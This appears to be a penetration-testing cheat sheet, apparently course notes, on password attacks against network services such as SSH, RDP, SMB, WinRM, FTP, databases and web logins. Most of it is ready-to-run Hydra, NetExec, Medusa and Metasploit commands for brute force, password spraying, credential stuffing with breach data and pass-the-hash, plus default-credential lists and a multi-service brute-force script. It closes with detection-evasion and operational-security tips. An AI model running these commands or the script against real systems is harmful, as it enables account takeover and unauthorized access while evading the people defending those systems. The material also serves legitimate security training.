# Network Services Password Attacks

## Common Network Services
- **WinRM** (TCP 5985/5986) - Windows Remote Management
- **SSH** (TCP 22) - Secure Shell
- **RDP** (TCP 3389) - Remote Desktop Protocol
- **SMB** (TCP 445) - Server Message Block
- **FTP** (TCP 21) - File Transfer Protocol
- **Telnet** (TCP 23) - Telnet
- **SMTP** (TCP 25) - Simple Mail Transfer Protocol
- **VNC** (TCP 5900) - Virtual Network Computing
- **LDAP** (TCP 389) - Lightweight Directory Access Protocol
- **MSSQL** (TCP 1433) - Microsoft SQL Server
- **MySQL** (TCP 3306) - MySQL Database
- **NFS** (TCP 2049) - Network File System

## NetExec (formerly CrackMapExec)

### Installation
```bash
# Install via apt
sudo apt-get -y install netexec

# Or from source
git clone https://github.com/Pennyw0rth/NetExec.git
cd NetExec
pip install -r requirements.txt
python setup.py install
```

### Basic Usage
```bash
# General syntax
netexec <protocol> <target> -u <user/userlist> -p <password/passwordlist>

# Supported protocols
netexec -h
# Available: nfs, ftp, ssh, winrm, smb, wmi, rdp, mssql, ldap, vnc
```

### Common Options
```bash
# Protocol-specific help
netexec smb -h

# Useful flags
-t THREADS          # Number of concurrent threads
--timeout TIMEOUT   # Connection timeout
--jitter INTERVAL   # Random delay between attempts
--continue-on-success  # Continue after finding valid creds
--verbose           # Verbose output
--no-bruteforce     # Don't bruteforce, use credentials as-is
```

## WinRM (Windows Remote Management)

### Ports
- **TCP 5985** - HTTP
- **TCP 5986** - HTTPS

### NetExec WinRM Attack
```bash
# Basic brute force
netexec winrm 10.129.42.197 -u user.list -p password.list

# Single user, password list
netexec winrm 10.129.42.197 -u administrator -p password.list

# Domain authentication
netexec winrm 10.129.42.197 -u user -p password -d domain.com
```

### Evil-WinRM
```bash
# Installation
sudo gem install evil-winrm

# Connect with credentials
evil-winrm -i 10.129.42.197 -u user -p password

# Connect with hash (pass-the-hash)
evil-winrm -i 10.129.42.197 -u user -H hash

# Connect with certificate
evil-winrm -i 10.129.42.197 -c cert.pem -k key.pem
```

## SSH (Secure Shell)

### Hydra SSH Attack
```bash
# Basic brute force
hydra -L user.list -P password.list ssh://10.129.42.197

# Single user
hydra -l user -P password.list ssh://10.129.42.197

# Reduce threads (recommended for SSH)
hydra -L user.list -P password.list -t 4 ssh://10.129.42.197

# Specify port
hydra -L user.list -P password.list -s 2222 ssh://10.129.42.197
```

### NetExec SSH Attack
```bash
# Basic attack
netexec ssh 10.129.42.197 -u user.list -p password.list

# Continue on success
netexec ssh 10.129.42.197 -u user.list -p password.list --continue-on-success
```

### SSH Connection
```bash
# Connect with password
ssh user@10.129.42.197

# Connect with key
ssh -i id_rsa user@10.129.42.197

# Connect to specific port
ssh -p 2222 user@10.129.42.197
```

## RDP (Remote Desktop Protocol)

### Hydra RDP Attack
```bash
# Basic brute force
hydra -L user.list -P password.list rdp://10.129.42.197

# Reduce threads (RDP doesn't like many connections)
hydra -L user.list -P password.list -t 1 rdp://10.129.42.197

# Add delays between attempts
hydra -L user.list -P password.list -t 4 -W 3 rdp://10.129.42.197
```

### NetExec RDP Attack
```bash
# Basic attack
netexec rdp 10.129.42.197 -u user.list -p password.list

# Check if account is active for RDP
netexec rdp 10.129.42.197 -u user -p password
```

### RDP Connection
```bash
# xfreerdp connection
xfreerdp /v:10.129.42.197 /u:user /p:password

# Full screen
xfreerdp /v:10.129.42.197 /u:user /p:password /f

# Specify resolution
xfreerdp /v:10.129.42.197 /u:user /p:password /w:1920 /h:1080

# Enable clipboard
xfreerdp /v:10.129.42.197 /u:user /p:password +clipboard
```

## SMB (Server Message Block)

### Hydra SMB Attack
```bash
# Basic brute force
hydra -L user.list -P password.list smb://10.129.42.197

# Single connection (SMB doesn't like parallel)
hydra -L user.list -P password.list -t 1 smb://10.129.42.197
```

### NetExec SMB Attack
```bash
# Basic attack
netexec smb 10.129.42.197 -u user.list -p password.list

# Enumerate shares after successful login
netexec smb 10.129.42.197 -u user -p password --shares

# List domain users
netexec smb 10.129.42.197 -u user -p password --users

# Password policy
netexec smb 10.129.42.197 -u user -p password --pass-pol

# Execute commands
netexec smb 10.129.42.197 -u user -p password -x "whoami"
```

### Metasploit SMB Login
```bash
# Start msfconsole
msfconsole -q

# Use SMB login module
use auxiliary/scanner/smb/smb_login

# Set options
set user_file user.list
set pass_file password.list
set rhosts 10.129.42.197
set threads 1

# Run the scan
run
```

### SMB Connection
```bash
# Connect with smbclient
smbclient -U user \\\\10.129.42.197\\SHARENAME

# List shares
smbclient -L //10.129.42.197 -U user

# Anonymous access
smbclient -N -L //10.129.42.197

# Mount SMB share
sudo mount -t cifs //10.129.42.197/share /mnt/smb -o username=user,password=password
```

## Other Services

### FTP Brute Force
```bash
# Hydra FTP
hydra -L user.list -P password.list ftp://10.129.42.197

# NetExec FTP
netexec ftp 10.129.42.197 -u user.list -p password.list
```

### MSSQL Brute Force
```bash
# NetExec MSSQL
netexec mssql 10.129.42.197 -u user.list -p password.list

# Execute queries
netexec mssql 10.129.42.197 -u user -p password -q "SELECT @@version"
```

### MySQL Brute Force
```bash
# Hydra MySQL
hydra -L user.list -P password.list mysql://10.129.42.197

# Connect to MySQL
mysql -h 10.129.42.197 -u user -p
```

### HTTP Basic Authentication
```bash
# Hydra Basic Auth on default port
hydra -l admin -P password.list target.com http-get /admin

# Custom port and path
hydra -l basic-auth-user -P passwords.txt 127.0.0.1 http-get / -s 81

# Multiple users with specific path
hydra -L usernames.txt -P passwords.txt target.com http-get /protected

# With verbose output
hydra -l admin -P rockyou.txt target.com http-get /admin -V

# Fast mode (stop after first success)
hydra -l admin -P passwords.txt target.com http-get /login -f
```

### HTTP Form-Based Authentication
```bash
# 1. Form Analysis (use browser developer tools)
# - Check form method (POST/GET)
# - Identify field names (username, password, etc.)
# - Note failure/success messages

# Generic login form
hydra -L usernames.txt -P passwords.txt target.com http-post-form "/login:username=^USER^&password=^PASS^:F=Invalid credentials"

# With custom port
└─$ hydra -L /usr/share/seclists/Usernames/top-usernames-shortlist.txt -P /usr/share/seclists/Passwords/2023-200_most_used_passwords.txt -f 94.237.54.192 -s 48750 http-post-form "/:username=^USER^&password=^PASS^:F=Invalid credentials"

# Success condition (redirect)
hydra -L usernames.txt -P passwords.txt target.com http-post-form "/login:user=^USER^&pass=^PASS^:S=302"

# Success condition (content match)
hydra -L usernames.txt -P passwords.txt target.com http-post-form "/login:user=^USER^&pass=^PASS^:S=Dashboard"

# WordPress specific
hydra -l admin -P passwords.txt target.com http-post-form "/wp-login.php:log=^USER^&pwd=^PASS^&wp-submit=Log+In:F=Invalid username"

# With additional form fields (CSRF, hidden fields)
hydra -l admin -P passwords.txt target.com http-post-form "/login:username=^USER^&password=^PASS^&csrf_token=abc123:F=Login failed"

# Fast mode (stop on first success)
hydra -L usernames.txt -P passwords.txt -f target.com http-post-form "/login:username=^USER^&password=^PASS^:F=Invalid"
```

#### Recommended Wordlists
```bash
# Download useful SecLists wordlists
curl -s -O https://raw.githubusercontent.com/danielmiessler/SecLists/master/Usernames/top-usernames-shortlist.txt
curl -s -O https://raw.githubusercontent.com/danielmiessler/SecLists/refs/heads/master/Passwords/Common-Credentials/2023-200_most_used_passwords.txt

# Common username lists
/usr/share/seclists/Usernames/top-usernames-shortlist.txt
/usr/share/seclists/Usernames/xato-net-10-million-usernames.txt

# Common password lists  
/usr/share/seclists/Passwords/Common-Credentials/2023-200_most_used_passwords.txt
/usr/share/wordlists/rockyou.txt
```

### VNC Brute Force
```bash
# NetExec VNC
netexec vnc 10.129.42.197 -u user.list -p password.list

# Hydra VNC
hydra -P password.list vnc://10.129.42.197
```

## Alternative Tool: Medusa

### Medusa Quick Reference
```bash
# Basic syntax: medusa [target_options] [credential_options] -M module [module_options]

# SSH brute force
medusa -h 192.168.1.100 -U usernames.txt -P passwords.txt -M ssh

# Multiple targets
medusa -H targets.txt -U usernames.txt -P passwords.txt -M ssh

# HTTP Basic Auth
medusa -h target.com -U users.txt -P passwords.txt -M http -m GET

# MySQL database
medusa -h 192.168.1.100 -u root -P passwords.txt -M mysql

# Empty/default password testing
medusa -h target.com -U users.txt -e ns -M ssh  # -e n (empty) -e s (same as username)

# Fast mode (stop after first success)
medusa -h target.com -U users.txt -P passwords.txt -M ssh -f

# Threading control
medusa -h target.com -U users.txt -P passwords.txt -M ssh -t 4

# Verbose output
medusa -h target.com -U users.txt -P passwords.txt -M ssh -v 4
```

### Medusa vs Hydra
```bash
# Medusa advantages:
# - Better error handling
# - Cleaner output
# - Built-in empty password testing

# Hydra advantages:  
# - More modules available
# - HTTP form support
# - More flexible syntax
```

---

## Attack Strategies

### 1. Service Enumeration
```bash
# Nmap service scan
nmap -sV -p- 10.129.42.197

# Specific service ports
nmap -p 22,445,3389,5985 10.129.42.197
```

### 2. Common Usernames
```bash
# Create common username list
echo -e "administrator\nadmin\nuser\nguest\nroot\nsa\nservice" > users.txt

# Domain-specific usernames
echo -e "domain\\administrator\ndomain\\admin\n.\\administrator" > domain_users.txt
```

### 3. Password Spraying
```bash
# Test common passwords across all users
netexec smb 10.129.42.197 -u users.txt -p "Password123!"

# Seasonal passwords
netexec smb 10.129.42.197 -u users.txt -p "Winter2024!"
```

### 4. Credential Stuffing
```bash
# Use breached credentials
netexec smb 10.129.42.197 -u users.txt -p breached_passwords.txt

# Domain credential reuse
netexec smb 10.129.42.197 -u domain_users.txt -p domain_passwords.txt
```

## Defense Evasion

### Rate Limiting
```bash
# Slow down attacks
hydra -L users.txt -P passwords.txt -t 1 -W 5 ssh://target

# Jitter in NetExec
netexec ssh target -u users.txt -p passwords.txt --jitter 5-10
```

### Account Lockout Awareness
```bash
# Stop on lockout
netexec smb target -u users.txt -p passwords.txt --gfail-limit 3

# Limit failed attempts per user
netexec smb target -u users.txt -p passwords.txt --ufail-limit 3
```

## Tips for Success

1. **Reduce threads** - Many services don't handle parallel connections well
2. **Use delays** - Avoid triggering rate limiting/lockouts
3. **Target specific services** - Focus on services that are commonly misconfigured
4. **Common credentials** - Try default/common passwords first
5. **Domain awareness** - Use domain-specific usernames and patterns
6. **Service-specific attacks** - Each service has unique characteristics
7. **Combine techniques** - Use multiple tools for comprehensive coverage

## Advanced Attack Techniques

### Password Spraying
**Definition:** Using a single password across many different user accounts

**When to use:**
- Companies with standard password policies
- Default passwords are commonly used
- Avoiding account lockouts (one password per user)
- Active Directory environments

**Tools:**
```bash
# NetExec password spray
netexec smb 10.100.38.0/24 -u usernames.list -p 'ChangeMe123!'

# Kerbrute for AD (faster)
kerbrute passwordspray --dc 10.100.38.1 usernames.txt 'Password123!'

# Hydra password spray
hydra -L usernames.txt -p 'Password123!' ssh://10.100.38.23

# Custom script for multiple targets
for ip in $(cat targets.txt); do
    netexec smb $ip -u usernames.txt -p 'Password123!'
done
```

**Common spray passwords:**
- `Password123!`
- `Welcome1!`
- `ChangeMe123!`
- `CompanyName2024!`
- `Summer2024!`
- `Monday123!`
- `P@ssw0rd`

### Credential Stuffing
**Definition:** Using stolen credentials from one service to access others

**Sources of credentials:**
- Database breaches
- Password dumps
- Previous compromises
- OSINT findings

**Tools:**
```bash
# Hydra with credential pairs
hydra -C user_pass.list ssh://10.100.38.23

# NetExec with credential pairs
netexec smb 10.100.38.23 -u users.txt -p passwords.txt --no-bruteforce

# Custom format: username:password
cat user_pass.list
admin:admin
user:password
root:toor
```

**Credential stuffing workflow:**
```bash
# 1. Prepare credentials from breach data
cat breach_data.txt | cut -d: -f1,2 > credentials.txt

# 2. Test against multiple services
for service in ssh smb rdp winrm; do
    echo "[*] Testing $service..."
    netexec $service targets.txt -C credentials.txt
done

# 3. Focus on successful hits
netexec smb successful_targets.txt -C credentials.txt --continue-on-success
```

### Default Credentials
**Definition:** Factory-set credentials that remain unchanged

**Common default credentials:**
```bash
# Database defaults
mysql: root:(blank)
mysql: root:root
mysql: root:password
postgres: postgres:postgres
mssql: sa:(blank)
mssql: sa:sa

# Web applications
admin:admin
administrator:password
admin:password
admin:(blank)
user:user

# Network devices
admin:admin
admin:password
admin:(blank)
root:root
```

**Default Credentials Cheat Sheet tool:**
```bash
# Install the tool
pip3 install defaultcreds-cheat-sheet

# Search for specific vendor
creds search linksys
creds search cisco
creds search netgear

# Export to file
creds search linksys --format csv > linksys_creds.csv
```

**Router default credentials:**
| Brand | Default IP | Username | Password |
|-------|------------|----------|----------|
| 3Com | 192.168.1.1 | admin | Admin |
| Belkin | 192.168.2.1 | admin | admin |
| D-Link | 192.168.0.1 | admin | Admin |
| Linksys | 192.168.1.1 | admin | Admin |
| Netgear | 192.168.0.1 | admin | password |
| Cisco | 192.168.1.1 | admin | cisco |

**Testing default credentials:**
```bash
# Create default credentials list
cat > default_creds.txt << EOF
admin:admin
admin:password
admin:
root:root
root:password
administrator:admin
user:user
guest:guest
EOF

# Test against multiple targets
netexec ssh 192.168.1.0/24 -C default_creds.txt
netexec smb 192.168.1.0/24 -C default_creds.txt
```

### Database Default Credentials
```bash
# MySQL defaults
mysql -h target -u root -p''
mysql -h target -u root -proot
mysql -h target -u admin -padmin

# PostgreSQL defaults
psql -h target -U postgres -d postgres
psql -h target -U admin -d admin

# MSSQL defaults
netexec mssql target -u sa -p ''
netexec mssql target -u sa -p sa
```

### IoT/Embedded Device Defaults
```bash
# Common IoT credentials
admin:admin
admin:password
admin:12345
admin:1234
root:root
root:password
user:user
guest:guest

# IP cameras
admin:admin
admin:password
admin:12345
root:pass
admin:

# Printers
admin:admin
admin:password
admin:
root:root
```

### Web Application Defaults
```bash
# Common web app defaults
admin:admin
admin:password
administrator:password
admin:changeme
root:root
demo:demo
test:test
guest:guest

# CMS defaults
wordpress: admin:admin
joomla: admin:admin
drupal: admin:admin
```

## Automation Script
```bash
#!/bin/bash
# Multi-service brute force script with advanced techniques

TARGET=$1
USERS="users.txt"
PASSWORDS="passwords.txt"
DEFAULT_CREDS="default_creds.txt"

echo "[+] Starting multi-service brute force against $TARGET"

# Phase 1: Default credentials
echo "[*] Testing default credentials..."
netexec ssh $TARGET -C $DEFAULT_CREDS
netexec smb $TARGET -C $DEFAULT_CREDS
netexec rdp $TARGET -C $DEFAULT_CREDS
netexec winrm $TARGET -C $DEFAULT_CREDS

# Phase 2: Password spraying
echo "[*] Password spraying common passwords..."
for password in "Password123!" "Welcome1!" "ChangeMe123!"; do
    netexec smb $TARGET -u $USERS -p "$password"
done

# Phase 3: Traditional brute force
echo "[*] Traditional brute force..."
netexec ssh $TARGET -u $USERS -p $PASSWORDS -t 4
netexec smb $TARGET -u $USERS -p $PASSWORDS
netexec rdp $TARGET -u $USERS -p $PASSWORDS
netexec winrm $TARGET -u $USERS -p $PASSWORDS

echo "[+] Brute force complete!"
```

## Best Practices for Advanced Attacks

### 1. Password Spraying Strategy
- Start with most common passwords
- Use seasonal/temporal passwords
- Include company-specific patterns
- Avoid account lockouts by limiting attempts

### 2. Credential Stuffing Tips
- Use recent breach data
- Focus on high-value services first
- Test corporate email patterns
- Check for credential reuse patterns

### 3. Default Credential Hunting
- Research target technologies
- Check vendor documentation
- Use automated tools
- Focus on forgotten/test systems

### 4. Operational Security
- Rotate IP addresses
- Use delays between attempts
- Monitor for detection systems
- Document successful patterns 